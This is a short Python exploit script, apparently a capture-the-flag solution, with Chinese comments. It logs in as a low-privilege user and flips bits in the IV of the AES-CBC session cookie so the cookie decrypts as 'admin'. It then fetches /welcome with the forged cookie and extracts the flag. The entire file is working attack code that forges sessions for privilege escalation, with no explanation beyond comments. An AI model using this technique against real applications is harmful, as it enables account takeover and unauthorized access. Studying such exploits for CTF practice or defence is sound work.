# coding:utf-8
import requests
import re
import sys

def Scan(url):
    flag = ""
    try:
        s = requests.Session()
        # 登录获取合法 session
        s.post(url + "/login", data={"username": "test1", "password": "test1"})
        cookie = s.cookies.get("session")
        data = bytes.fromhex(cookie)
        iv = data[:16]
        ct = data[16:32]

        # 构造目标明文和原始明文
        target = b"admin" + b"\x00" * 11
        orig = b"test1" + b"\x00" * 11
        # 计算新的 IV，使解密后为 admin
        new_iv = bytes([iv[i] ^ orig[i] ^ target[i] for i in range(16)])

        # 拼接伪造的 session
        payload = (new_iv + ct).hex()
        cookies = {"session": payload}
        # 访问 /welcome，获取 flag
        r = requests.get(url + "/welcome", cookies=cookies)
        # 匹配 flag{xxx} 或 FLAG{xxx}
        match = re.search(r"(flag|FLAG)\{.*?\}", r.text)
        if match:
            flag = match.group(0)
    except Exception as e:
        print(e)
    return flag


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python exp.py <url>")
    else:
        print(Scan(url=sys.argv[1]))
